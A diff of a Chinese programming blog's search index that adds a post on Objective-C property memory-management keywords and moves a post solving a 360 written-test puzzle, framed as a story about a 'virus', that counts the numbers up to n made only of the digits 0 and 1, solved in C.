@@ -80,6 +80,167 @@
       </categories>
   </entry>
   <entry>
+    <title>property 中的常用关键字分析</title>
+    <url>/c6e2f716.html</url>
+    <content><![CDATA[<h2 id="栈与堆"><a href="#栈与堆" class="headerlink" title="栈与堆"></a>栈与堆</h2><p>首先，我们需要知道：为什么<strong>只有Objective-C对象需要进行内存管理</strong>，而其它非对象类型（如基本数据类型）不需要我们来管理呢？</p>
+<blockquote>
+<p>因为： Objective-C 的对象在内存中是以堆的方式分配空间的</p>
+<ul>
+<li>堆里面的内存是动态分配的，所以也就需要程序员手动的去添加内存、回收内存</li>
+<li>OC对象存放于堆里面(堆内存要程序员手动回收，也就是 release )</li>
+<li>非OC对象一般放在栈里面(栈内存会被系统自动回收)</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+<p>例如：</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</div><div class="line"><span class="keyword">int</span> b = <span class="number">20</span>;</div><div class="line">Car *c = [[Car alloc] init];</div></pre></td></tr></tbody></table>
+
+<p>我们知道OC对象一般都是指针形式，大神ibireme在 <a href="http://blog.ibireme.com/2013/11/25/objc-object/">Objective-C 中的类和对象</a>中提到：</p>
+<blockquote>
+<p>凡是首地址是*isa的struct指针，都可以被认为是objc中的对象。运行时可以通过isa指针，查找到该对象是属于什么类(Class)。</p>
+</blockquote>
+<p>下图可以清楚的表示 OC 中的堆栈分配：</p>
+<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE1.png"></p>
+<h2 id="assign-与-weak"><a href="#assign-与-weak" class="headerlink" title="assign 与 weak"></a>assign 与 weak</h2><blockquote>
+<p><strong>基础知识提要</strong></p>
+<p>@property 声明的属性，会自动创建 getter,setter 方法。 属性中申明的关键字主要有三大类：</p>
+<ul>
+<li>readwrite/readonly： 是否生成 setter 方法, 默认 readwrite</li>
+<li>assign/weak/strong/copy/retain： setter 方法中如何传递所有权等内存管理策略, ARC 环境默认为 strong</li>
+<li>nonatomic/atomic：是否加线程锁（并不能完全控制线程访问，最好事是自己手动底层加锁，默认 atomic</li>
+</ul>
+</blockquote>
+<p><em>NSString 的引用计数LLVM是有优化的，并不是简单根据设定的关键字来判断。本文只是为了方便易懂，以这个类作为例子。</em></p>
+<h3 id="assign"><a href="#assign" class="headerlink" title="assign"></a>assign</h3><p>如果设置 assign ，在 setter 方法中是这样的：</p>
+<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setCarName:(<span class="built_in">NSString</span> *)name {</div><div class="line">    _carName = name;  <span class="comment">//默认是有下划线的</span></div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>也就是说成员变量 _name 并没有获得 name 所指的对象的所有权，原来对象 @“Amywushu” 的 retainCount 不会改变。一旦 name 被释放，_carName 也就不再指向一个合法的位置，出现指针悬空，如下图所示，相当于 _carName （图中为 carName ）指向的 name，但实际上 _carName 是指向OC对象的，这里只是为了方便理解。</p>
+<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE2assign.png"></p>
+<h3 id="assign-weak-的区别"><a href="#assign-weak-的区别" class="headerlink" title="assign/weak 的区别"></a>assign/weak 的区别</h3><p>ARC 中 OC 对象已经不再使用 assign 了，而是使用 weak ，两者的区别在： weak 弱引用所指的对象没有被任何strong指针指向，那么就将被销毁，所有指向这个对象的 weak 指针也将被置为 nil 。而 assign 不会被置为 nil 。但对于非 OC 对象来讲，因为其存储空间在栈上，由系统管理内存，所以一般还是使用 assign。</p>
+<h3 id="unsafe-unretained"><a href="#unsafe-unretained" class="headerlink" title="unsafe_unretained"></a>unsafe_unretained</h3><p>unsafe_unretained 的语义与 assign 类似，相当于用于 OC 对象类型的 assign 。使用这个关键字主要出于性能考虑，因为 weak 对性能有一些影响，因此对性能要求高的地方可以考虑使用 unsafe_unretained 替换 weak 。比如 <a href="https://github.com/ibireme/YYModel/blob/master/YYModel/NSObject%2BYYModel.m">YYModel</a> 的实现，为了追求更高的性能，其中大量使用 unsafe_unretained 作为变量标识符。</p>
+<h2 id="retain-与-strong"><a href="#retain-与-strong" class="headerlink" title="retain 与 strong"></a>retain 与 strong</h2><blockquote>
+<p><strong>知识点:</strong></p>
+<p><strong>MRR内存管理基本原则</strong></p>
+<ol>
+<li>为创建的所有对象设置所有权</li>
+<li>应使用retain方法获取对象（你尚未拥有）的所有权</li>
+<li>当不再使用某个对象时，必须放弃其所有权</li>
+<li>不能放弃不归你所有的对象的所有权</li>
+</ol>
+</blockquote>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="comment">//对象通过 alloc 消息创建后，变量 atom 就拥有了该对象的所有权（原则1）</span></div><div class="line">Atom *atom = [[Atom alloc] init];</div><div class="line"></div><div class="line"><span class="comment">//变量 href 获取了这个对象的所有权（原则2），不能写成 Atom *href = atom; </span></div><div class="line"><span class="comment">//这样写的话 href 没有获取对象的所有权，一旦 atom 释放了，href 就不再指向一个合法的位置，出现指针悬空。</span></div><div class="line">Atom *href = [atom <span class="keyword">retain</span>];</div><div class="line"></div><div class="line"><span class="comment">// 变量 atom 释放，但 href 依旧拥有该对象的所有权</span></div><div class="line">[atom release];</div><div class="line"></div><div class="line"><span class="comment">// 变量 href 释放，对象引用计数变为 0 ，运行时系统可以释放对象了</span></div><div class="line">[href release];</div></pre></td></tr></tbody></table>
+
+<p>——引用自<a href="https://yq.aliyun.com/articles/57166?&utm_source=qq">[精通Objective-C]内存管理</a></p>
+<p>如果设置 retain ，在 setter 方法中是这样的：</p>
+<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setCarName:(<span class="built_in">NSString</span> *)name {</div><div class="line">    <span class="keyword">if</span> (_carName != name) {</div><div class="line">        [_carName release];</div><div class="line">        _carName = [name <span class="keyword">retain</span>];</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>也就是说，retain/strong 会在 setter 方法中，对传入的对象 <code>&quot;Amywushu&quot;</code> 进行引用计数 +1 的操作。简单来说，就是会拥有传入对象 <code>&quot;Amywushu&quot;</code> 的所有权，而不是像 assign/weak 一样，依赖于传入的对象指针 <code>name</code> ，而并非拥有实际所有权。</p>
+<p>相当于一个保险柜拥有两把钥匙，变量解除所有权 (release) ，也就相当于归还钥匙。当两把钥匙都被归还之后，这个保险柜（对象）也就会被释放。只要拥有该对象的所有权（至少有一把钥匙没有归还），这个对象就不会被释放。</p>
+<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE3.png"></p>
+<p>如图所示，<code>_carName</code> 和 <code>name</code> 均拥有对 <code>Amywushu</code> 这个字符串对象的所有权，该对象的引用计数变为 1+1=2 。</p>
+<p>strong 是在 iOS 引入 ARC 的时候引入的关键字，是retain的一个可选的替代。 strong 跟 retain 的意思相同并产生相同的代码，但是语意上更好更能体现对象的关系。</p>
+<p>关于 strong 和 weak 还有什么不清楚的话，可以学习 onevcat 的<a href="https://onevcat.com/2012/06/arc-hand-by-hand/">手把手教你ARC——iOS/Mac开发ARC入门和使用</a>这篇文章，讲得非常清晰易懂。</p>
+<h2 id="copy-与-mutableCopy"><a href="#copy-与-mutableCopy" class="headerlink" title="copy 与 mutableCopy"></a>copy 与 mutableCopy</h2><p>copy 、mutableCopy 与 strong 的区别在于，深拷贝时，示例变量对于传入对象的副本拥有所有权，而不是对象本身；浅拷贝时，则没有区别。<br>如果设置 copy ，在 setter 方法中是这样的：</p>
+<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setCarName:(<span class="built_in">NSString</span> *)name {</div><div class="line">    <span class="keyword">if</span> (_carName != name) {</div><div class="line">        [_carName release];</div><div class="line">        _carName = [name <span class="keyword">copy</span>];</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE4.png"></p>
+<p>如上图所示，原来对象的 retainCount 不变，新 copy 出来的对象副本的 retainCount=1 ，原对象引用计数不变，两者 copy 之后互不相关，这是深拷贝。</p>
+<blockquote>
+<ul>
+<li><strong>深拷贝与浅拷贝</strong></li>
+</ul>
+<p><strong>深拷贝</strong>： 是对内存空间的拷贝，也就是这里的 copy（数组等类型例外）<br><strong>浅拷贝</strong>： 是对内存地址的拷贝，也就是上面的 retain/strong，以及 copy 的某些情况<br><strong>深拷贝和浅拷贝比较复杂，我的另一篇文章有具体讲解<a href="https://harpersu00.github.io/accb5a79.html">copy 与 mutableCopy（传说中的深浅拷贝</a>，这里只是简要提及一下。</strong></p>
+</blockquote>
+<p><strong>注意！ 如果是 copy 的是一个 NSArray 呢?</strong> 比如：</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSArray</span> *array = [<span class="built_in">NSArray</span> arrayWithObjects:<span class="string">@"hello"</span>,<span class="string">@"world"</span>,<span class="string">@"baby"</span>];</div><div class="line"><span class="built_in">NSArray</span> *array2 = [array <span class="keyword">copy</span>];</div></pre></td></tr></tbody></table>
+
+<p>这个时候,系统的确是为 array2 开辟了一块内存空间,但是我们要知道的是, array2 中的每个元素,,只是 copy 了指向 array 中相对应元素的指针，这是<strong>“单层深拷贝”</strong>.</p>
+<hr>
+<p><strong>一般来说，不要将 copy 用到 NSMutableString ，NSMutableArray ，NSMutableDictionary 等可变对象上，除非有特别的需求。</strong></p>
+<p>例如:</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSMutableArray</span> *mutableArray_copy;</div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)viewDidLoad {</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line"></div><div class="line">    <span class="built_in">NSMutableArray</span> *mutableArray = [<span class="built_in">NSMutableArray</span> arrayWithObject:<span class="string">@"123"</span>];</div><div class="line">    <span class="keyword">self</span>.mutableArray_copy = mutableArray;</div><div class="line"></div><div class="line">    [<span class="keyword">self</span>.mutableArray_copy addObject:<span class="string">@"456"</span>];</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>运行则会报出错误 <strong>signal SIGABRT</strong></p>
+<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE5.png"></p>
+<p>我们明明在代码里用的 NSMutableArray 这个可变数组，为什么错误里会说是在向 NSArray 这个不可变数组，调用 addObject: 这个方法呢？（ __NSArrayI 表示的是 NSArray 类型）。<br>是因为在 <code>self.mutableArray_copy = mutableArray;</code> 这一句的时候，会调用 mutableArray_copy 的 setter 方法， copy 属性默认 setter 方法是这样写的:</p>
+<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setMutableArray_copy:(<span class="built_in">NSMutableArray</span> *)mutableArray_copy {</div><div class="line">    _mutableArray_copy = [mutableArray_copy <span class="keyword">copy</span>];</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>setter 方法里调用的是 copy，而不是 mutableCopy ，也就是说拷贝过来的是不可变的 NSArray 类型。那么 NSMutableArray 的添加元素等方法自然就不能使用了。<br>解决方法为：将 copy 改为 strong ；或者重写 setter 方法，将 copy 改为 mutableCopy 。</p>
+<blockquote>
+<p>copy 现在都比较少用，一般用于 NSString 。因为<strong>父类指针可以指向子类对象</strong>，NSMutableNSString 是 NSString 的子类，使用 strong 的话虽然 NSString 是不可变对象，但是它传入的值可能会是 NSMutableString 可变对象，<strong>如果这个可变对象的内容在其他地方被修改了，那 NSString 指针所指的对象也随之改变了</strong>，而其本身可能对此毫不知情。因此一般用 copy 。</p>
+</blockquote>
+<h2 id="nonull-nullable-null-resettable"><a href="#nonull-nullable-null-resettable" class="headerlink" title="nonull nullable null_resettable"></a>nonull nullable null_resettable</h2><p>这三个属性关键字是 WWDC2015 中介绍的 OC 新特性，与 Swift 中的 ? 和 ! 类似。</p>
+<ul>
+<li><strong>nonull</strong>：该属性不能为 nil ,必须有值。</li>
+<li><strong>nullable</strong>：表示可选的，可以为 nil。</li>
+<li><strong>null_resettable</strong>：表示 setter 方法是 nullable ,可以为 nil；而 getter 方法是nonull ，必须有值。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，就是内存处理方式不一样，assign/weak 相当于借用传入的指针变量来指向对象（实际上并不是，可以这样理解），retain/strong 相当于不同的指针变量指向同一个对象，copy 则是在内存里复制了一个对象并指向它。读写属性以及原子性比较简单，不再赘述。</p>
+<p>关于 atomic 的锁机制，以及 ARC 机制到底如何进行的内存管理，之后会进一步学习。敬请期待。</p>
+<p>2016.12.07 补充：</p>
+<p>新增博文： <a href="https://harpersu00.github.io/cc4dc5e6.html">ARC 是如何进行内存管理的</a></p>
+<hr>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Objective-C 内存管理——你需要知道的一切　<a href="https://segmentfault.com/a/1190000004943276">https://segmentfault.com/a/1190000004943276</a><br>[2] @property属性关键字详解　<a href="http://www.wugaojun.com/blog/2015/07/25/at-propertyshu-xing-guan-jian-zi-xiang-jie/">http://www.wugaojun.com/blog/2015/07/25/at-propertyshu-xing-guan-jian-zi-xiang-jie/</a><br>[3] Objective-C 的自动引用计数（ARC）　<a href="https://hran.me/archives/objective-c-automatic-reference-counting.html">https://hran.me/archives/objective-c-automatic-reference-counting.html</a><br>[4] Objective-c 内存管理的历史和参考资料　<a href="http://www.pchou.info/ios/2015/06/05/oc-memory-management.html">http://www.pchou.info/ios/2015/06/05/oc-memory-management.html</a></p>
+]]></content>
+      <categories>
+        <category>编程语言语法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>C语言编程题（2016年360笔试习题之病毒）</title>
+    <url>/e3f92699.html</url>
+    <content><![CDATA[<h2 id="题目（编程题：病毒）"><a href="#题目（编程题：病毒）" class="headerlink" title="题目（编程题：病毒）"></a>题目（编程题：病毒）</h2><p>小B最近对破解和程序攻击产生了兴趣，她迷上了病毒，然后可怕的事情发生了。不知道什么原因，可能是小B的技术水平还不够高，小B编写的病毒程序在攻击一个服务器时出现了问题。尽管成功的入侵了服务器，但并没有按照期望的方式发挥作用。</p>
+<p>小B的目的很简单：控制服务器内存区域，试图在内存中装入从1到n之间的n个自然数，以覆盖内存区域。可能是小B对编程理解上的问题，病毒似乎没有完全成功。可能是由于保护机制的原因，内存写入只接受二进制的形式，所以十进制表达中除了0和1之外的其他值都没有成功写入内存。小B希望知道，究竟有多少数成功的写入了服务器的内存！</p>
+<a id="more"></a>
+
+<p><strong>输入</strong></p>
+<blockquote>
+<p>输入中有多组测试数据，每组测试数据在单独的一行中，为整数n（1&lt;=n&lt;=10^9）。</p>
+</blockquote>
+<p><strong>输出</strong></p>
+<blockquote>
+<p>对每组测试数据，在单独的行中输出问题的答案。</p>
+</blockquote>
+<p><strong>举例</strong></p>
+<blockquote>
+<p>输入：10<br>输出： 2</p>
+<p>输入：20<br>输出：3</p>
+</blockquote>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><table><tbody><tr><td class="code"><pre><div class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">&nbsp;*&nbsp; 1. 输入的字符数组从最高位开始依次与1做比较</div><div class="line">&nbsp;*&nbsp; 2. 小于等于1 取原值，并比较下一位，如果没有下一位，则返回；</div><div class="line">&nbsp;*&nbsp; 3. 大于1，则其后的位数都取1，并返回；</div><div class="line">&nbsp;*&nbsp; 4. 将得到的字符数组看作二进制，并转化为十进制。</div><div class="line">&nbsp;*</div><div class="line">&nbsp;*/</div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> addarray[<span class="number">10</span>] = <span class="string">""</span>;</div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> array1[<span class="number">10</span>] = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span> * <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *cstring, <span class="keyword">int</span> n)</span> </span>{</div><div class="line">    <span class="keyword">char</span> compareString = *(cstring + n);</div><div class="line">    <span class="keyword">char</span> *onestring = <span class="string">"1"</span>;</div><div class="line">    <span class="keyword">char</span> <span class="built_in">array</span>[<span class="number">10</span>] = <span class="string">""</span>;</div><div class="line">    <span class="keyword">char</span> *rec = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(onestring,&amp;compareString) &gt;= <span class="number">0</span>) {  <span class="comment">//compareString &lt;= 1</span></div><div class="line">        <span class="built_in">array</span>[<span class="number">0</span>] = compareString;</div><div class="line">        <span class="keyword">if</span> (*(cstring+n+<span class="number">1</span>)) {</div><div class="line">            <span class="built_in">strcat</span>(<span class="built_in">array</span>, fun(cstring, n+<span class="number">1</span>));</div><div class="line">            <span class="built_in">strcpy</span>(addarray, <span class="built_in">array</span>);</div><div class="line">            rec = addarray;</div><div class="line">        }</div><div class="line">        <span class="keyword">else</span></div><div class="line">            rec = cstring + n;</div><div class="line"></div><div class="line">    }</div><div class="line">    <span class="keyword">else</span> {         <span class="comment">//compareString &gt; 1</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="built_in">strlen</span>(cstring) - n); i++) {</div><div class="line">            <span class="built_in">strcat</span>(array1, onestring);</div><div class="line">        }</div><div class="line">        rec = array1;</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="keyword">return</span> rec;</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>{</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">char</span> nstring[<span class="number">10</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Input String:"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, nstring);</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">char</span> *resultString = fun(nstring, <span class="number">0</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, resultString);</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">long</span> result = strtol(resultString, <span class="literal">NULL</span>, <span class="number">2</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, result);</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>输出：</p>
+<blockquote>
+<p>Input String:20<br>11<br>3</p>
+<p>Input String:1040<br>1011<br>11</p>
+<p>Input Stirng:2300304<br>1111111<br>127</p>
+</blockquote>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><p><strong>关于字符数组和字符串在函数间的传递</strong></p>
+<p>从代码中可以看到我用了两个静态数组变量，之所以不直接定义在函数体内作为局部变量是因为：</p>
+<blockquote>
+<p>当用字符指针<code>char*</code>返回字符数组首地址时，函数体内的局部变量数组里的值已经被释放，返回的首地址虽然没有变，但里面的值已经无意义了。</p>
+</blockquote>
+<p>例如：</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line">  </div><div class="line">  <span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">()</span></span></div><div class="line">  {</div><div class="line">      <span class="comment">//char tmp[30]="测试";</span></div><div class="line">      <span class="keyword">char</span> *tmp=<span class="string">"测试"</span>;<span class="comment">//写成这样可以用指针返回数组首地址</span></div><div class="line">     <span class="keyword">return</span> tmp;</div><div class="line"> }</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"> {</div><div class="line">     <span class="built_in">printf</span>(<span class="string">"%s"</span>,test());</div><div class="line"> }</div></pre></td></tr></tbody></table>
+
+<p>打印出来的值可能是乱码也能为nil。<br>解决方式：<br><strong>1. static全局变量</strong></p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">()</span></span></div><div class="line">{</div><div class="line">     <span class="keyword">static</span> <span class="keyword">char</span> tmp[<span class="number">30</span>]=<span class="string">"static测试"</span>;</div><div class="line">     <span class="keyword">return</span> tmp;</div><div class="line">}</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,test());</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>在数组tmp[30]前面加入了<code>static</code>关键字，它就使得<code>tmp[30]</code>存放在内存中的静态存储区中，所占用的存储单元一直不释放，直到整个程序运行结束。所以当主函数调用完<code>print()</code>函数后，该空间依然存在。所以<code>main()</code>函数中接到首地值后可以访问数组中的元素。</p>
+<p><strong>2. 结构体作为返回值</strong></p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> ret</div><div class="line">{</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</div><div class="line">};</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">struct</span> ret <span class="title">test</span><span class="params">(<span class="keyword">char</span> *tmp)</span></span></div><div class="line">{</div><div class="line">    <span class="keyword">struct</span> ret a;</div><div class="line">    <span class="built_in">strcpy</span>(a.buf,tmp);</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">    <span class="keyword">struct</span> ret b;</div><div class="line">    b=test(<span class="string">"用结构体作为返回值传递数组"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,b.buf);</div><div class="line">}</div></pre></td></tr></tbody></table>
+
+<p>两点注意：</p>
+<p>1、数组之间的赋值不要直接，即不要直接将数组 A 赋给数组 B，而是要用<code>strcpy</code>（字符型数组）或者<code>memcpy</code>（非字符型数组）。</p>
+<p>2、用结构体定义变量和函数时不要忘了结构体名（上面程序的<code>ret</code>）。</p>
+<hr>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] 【原】C语言函数返回数组的问题　<a href="http://www.cnblogs.com/wuqi1003/archive/2013/01/09/2853657.html">http://www.cnblogs.com/wuqi1003/archive/2013/01/09/2853657.html</a><br>[2] C语言中字符串如何转换为二进制、八进制、十进制、十六进制　 　<a href="http://blog.csdn.net/edonlii/article/details/9162769">http://blog.csdn.net/edonlii/article/details/9162769</a><br>[3] C语言之strcat函数　<a href="http://blog.csdn.net/hgj125073/article/details/8439448">http://blog.csdn.net/hgj125073/article/details/8439448</a><br>[4] C语言strcmp()函数：比较字符串（区分大小写）　<a href="http://c.biancheng.net/cpp/html/162.html">http://c.biancheng.net/cpp/html/162.html</a></p>
+]]></content>
+      <categories>
+        <category>习题</category>
+      </categories>
+  </entry>
+  <entry>
     <title>栈·参数存储排布</title>
     <url>/d3a97ef3.html</url>
     <content><![CDATA[<h2 id="基础提要：栈结构"><a href="#基础提要：栈结构" class="headerlink" title="基础提要：栈结构"></a>基础提要：栈结构</h2><p>ARM内存中的栈区域是满递减的，由高地址向低地址增长，SP指针始终指向最后一个压入栈的地址，即栈顶地址。如图所示：</p>
@@ -145,59 +306,6 @@
 ]]></content>
       <categories>
         <category>基础知识</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>C语言编程题（2016年360笔试习题之病毒）</title>
-    <url>/e3f92699.html</url>
-    <content><![CDATA[<h2 id="题目（编程题：病毒）"><a href="#题目（编程题：病毒）" class="headerlink" title="题目（编程题：病毒）"></a>题目（编程题：病毒）</h2><p>小B最近对破解和程序攻击产生了兴趣，她迷上了病毒，然后可怕的事情发生了。不知道什么原因，可能是小B的技术水平还不够高，小B编写的病毒程序在攻击一个服务器时出现了问题。尽管成功的入侵了服务器，但并没有按照期望的方式发挥作用。</p>
-<p>小B的目的很简单：控制服务器内存区域，试图在内存中装入从1到n之间的n个自然数，以覆盖内存区域。可能是小B对编程理解上的问题，病毒似乎没有完全成功。可能是由于保护机制的原因，内存写入只接受二进制的形式，所以十进制表达中除了0和1之外的其他值都没有成功写入内存。小B希望知道，究竟有多少数成功的写入了服务器的内存！</p>
-<a id="more"></a>
-
-<p><strong>输入</strong></p>
-<blockquote>
-<p>输入中有多组测试数据，每组测试数据在单独的一行中，为整数n（1&lt;=n&lt;=10^9）。</p>
-</blockquote>
-<p><strong>输出</strong></p>
-<blockquote>
-<p>对每组测试数据，在单独的行中输出问题的答案。</p>
-</blockquote>
-<p><strong>举例</strong></p>
-<blockquote>
-<p>输入：10<br>输出： 2</p>
-<p>输入：20<br>输出：3</p>
-</blockquote>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><table><tbody><tr><td class="code"><pre><div class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">&nbsp;*&nbsp; 1. 输入的字符数组从最高位开始依次与1做比较</div><div class="line">&nbsp;*&nbsp; 2. 小于等于1 取原值，并比较下一位，如果没有下一位，则返回；</div><div class="line">&nbsp;*&nbsp; 3. 大于1，则其后的位数都取1，并返回；</div><div class="line">&nbsp;*&nbsp; 4. 将得到的字符数组看作二进制，并转化为十进制。</div><div class="line">&nbsp;*</div><div class="line">&nbsp;*/</div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> addarray[<span class="number">10</span>] = <span class="string">""</span>;</div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> array1[<span class="number">10</span>] = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span> * <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *cstring, <span class="keyword">int</span> n)</span> </span>{</div><div class="line">    <span class="keyword">char</span> compareString = *(cstring + n);</div><div class="line">    <span class="keyword">char</span> *onestring = <span class="string">"1"</span>;</div><div class="line">    <span class="keyword">char</span> <span class="built_in">array</span>[<span class="number">10</span>] = <span class="string">""</span>;</div><div class="line">    <span class="keyword">char</span> *rec = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(onestring,&amp;compareString) &gt;= <span class="number">0</span>) {  <span class="comment">//compareString &lt;= 1</span></div><div class="line">        <span class="built_in">array</span>[<span class="number">0</span>] = compareString;</div><div class="line">        <span class="keyword">if</span> (*(cstring+n+<span class="number">1</span>)) {</div><div class="line">            <span class="built_in">strcat</span>(<span class="built_in">array</span>, fun(cstring, n+<span class="number">1</span>));</div><div class="line">            <span class="built_in">strcpy</span>(addarray, <span class="built_in">array</span>);</div><div class="line">            rec = addarray;</div><div class="line">        }</div><div class="line">        <span class="keyword">else</span></div><div class="line">            rec = cstring + n;</div><div class="line"></div><div class="line">    }</div><div class="line">    <span class="keyword">else</span> {         <span class="comment">//compareString &gt; 1</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="built_in">strlen</span>(cstring) - n); i++) {</div><div class="line">            <span class="built_in">strcat</span>(array1, onestring);</div><div class="line">        }</div><div class="line">        rec = array1;</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="keyword">return</span> rec;</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> 